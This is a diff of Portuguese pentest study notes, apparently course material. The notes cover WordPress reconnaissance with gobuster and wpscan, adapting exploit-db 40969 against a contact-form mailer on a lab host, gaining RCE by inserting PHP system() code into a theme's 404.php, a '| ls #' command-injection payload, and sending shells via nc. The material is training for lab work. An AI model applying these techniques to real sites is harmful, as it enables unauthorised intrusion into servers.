+Consiste basicamente em explorar vulnerabilidades da aplicação onde há campos de envio de mensagens como de comentários ou formulários de solicitação de contato, por isso o mailer, fazendo uso de exploits do exploit-db.com/exploits/40969 adaptando para uso do ambiente de teste atual assim como também o diretório onde será salvo o arquivo gerado pelo exploit. Alterar os parâmetros do campo do formulário e preencher todos para não dar erro de envio. Deve descobrir um local para upload de arquivos e que possa clicar para executar o arquivo e validar o código enviado. Se não funcionar alterar entre os payloads disponíveis. Além de opcionalmente enviar uma shell para a aplicação usando o `$_GET` ou o `NC`. Host 172.30.0.125
 
-Construindo o Mindset Hacking
+- Construindo o Mindset Hacking
 
 Sempre buscar saber como funciona toda a aplicação, seja buscando a aplicação na internet ou fazendo uma cópia, caso seja código aberto. Entendendo esse funcionamento, fica mais fácil a enumeração do alvo. Wordpress.org/download Fazer o donwload da aplicação para uso
 
     unzip arquivo.zip -d /caminho/desejado/unzipeg
 
-        Descompacta o arquivo baixado
+Descompacta o arquivo baixado
 
     create database wordpress; 
 
-        Cria a base de dados para ser usada pelo wordpress
+Cria a base de dados para ser usada pelo wordpress
 
     mv wp-configSample wp-config.php 
 
-        Renomeia o exemplo do arquivo de configuração para deixar pronto
+Renomeia o exemplo do arquivo de configuração para deixar pronto
 
     nano wp-config.php 
 
-        Adiciona as informações do mysql e nome do banco de dados e finaliza a instalação na web.
+Adiciona as informações do mysql e nome do banco de dados e finaliza a instalação na web.
 
 
-Testando e explorando: Wordpress
+- Testando e explorando: Wordpress
 
 Fazendo o reconhecimento da plataforma e posteriormente rodando ferramentas para descobrir vulnerabilidades. Wordpress usa o phpass como hash de senha.
 
     gobuster dns -d grupobusinesscorp.com -w /wordlist/smal.durb -t 30
 
-        Faz um BF na aplicação para descoberta de subdomínios
+Faz um BF na aplicação para descoberta de subdomínios
 
     wpscan --url blog.businesscorp.com/blog --api-token tokenaquiaddress 
 
-        Apenas para auth user
+Apenas para auth user
 
     wpscan --url blog.businesscorp.com/blog --api-token tokenapeiaddress --enumerate p --plugins-detection aggressive 
 
-        Busca por plugins da base previamente conhecida
+Busca por plugins da base previamente conhecida
 
     wpscan --url blog.businesscorp.com/blog --api-token tokenapeiaddress --enumerate vp --plugins-detection aggressive 
 
-        Busca por uma lista de plugins vulneráveis
-
+Busca por uma lista de plugins vulneráveis
 
 Procurar pelo nome do exploit-db plugin plugin wpforum 1.7 exploit 17684
 
 /blog/wp-content/themes/classic/404.php Caminho do plugin 404
 
-Obtendo RCE via Wordpress
+- Obtendo RCE via Wordpress
 
-Quando com acesso à página de administração do wordpress, e para isso é recomendável procurar algum lugar que possibilite a edição e nisso inserindo um código php com o system(id); podendo executar códigos na aplicação e ganhar acesso ao servidor. Ao identificar, deve-se procurar o local/diretório deste plugin ou tema para poder ir até o mesmo e executar o código que foi inserido. tema usado foi o 404.php
+Quando com acesso à página de administração do wordpress, e para isso é recomendável procurar algum lugar que possibilite a edição e nisso inserindo um código php com o system(id); podendo executar códigos na aplicação e ganhar acesso ao servidor. Ao identificar, deve-se procurar o local/diretório deste plugin ou tema para poder ir até o mesmo e executar o código que foi inserido. tema usado foi o `404.php`
 
-Se mantendo atualizado OWASP
+- Se mantendo atualizado OWASP
 
 Open Web Application Security Project: https://owasp.org/
 
-    Laboratórios para montar local e/ou online:
+Laboratórios para montar local e/ou online:
 
         DBWA
-
         BWAPP
-
         PentesterLab
 
-
-    Livros:
+Livros:
 
         Webaplication Hackers
-
         Real World Bug Hunt
-
         Pentest em Aplicação web
-
         Arte de Invadir
-
         Arte de enganar
-
-        Filme:
+Filme:
 
         Prenda-me se for capaz
-
         VIPs
 
-Inserção de código direta
+- Inserção de código direta
 
-Exploração de aplicações que fazem comandos no server, por exemplo, a resposta de um comando PING, para dar bypass basta inserir o | command # Exemplo: | ls #
+Exploração de aplicações que fazem comandos no server, por exemplo, a resposta de um comando PING, para dar bypass basta inserir o `| command #` Exemplo: `| ls #`
 
-Fazendo Select Direto Passando o banco MYSQL
+- Fazendo Select Direto Passando o banco MYSQL
 
     SELECT * FROM database.tabela 
 
-        O comando faz um dump na tabela do banco passado, de todos os campos, podendo ser passado, claro os nomes dos campos para ter uma saída mais limpa
+O comando faz um dump na tabela do banco passado, de todos os campos, podendo ser passado, claro os nomes dos campos para ter uma saída mais limpa
 
 
-    PÓS EXPLORAÇÃO
+## PÓS EXPLORAÇÃO
 
 
 Diferença entre Shells -> interativa e não interativa
